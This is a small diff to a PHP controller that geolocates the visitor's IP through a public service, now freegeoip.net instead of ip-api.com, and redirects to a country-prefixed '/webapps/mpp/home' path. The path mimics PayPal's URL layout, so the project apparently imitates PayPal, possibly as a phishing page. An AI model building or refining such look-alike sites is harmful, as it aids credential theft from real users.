@@ -10,14 +10,14 @@ class MainController extends Controller
     {
 
       $ch = curl_init();
-      curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $_SERVER['REMOTE_ADDR']);
+      curl_setopt($ch, CURLOPT_URL, "http://freegeoip.net/json/" . $_SERVER['REMOTE_ADDR']);
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
       $url = curl_exec($ch);
       $decode = json_decode($url, true);
 
-      return redirect("/" . strtolower($decode['countryCode']) . "/webapps/mpp/home");
+      return redirect("/" . strtolower($decode['country_code']) . "/webapps/mpp/home");
     }
 
     public function index($country)
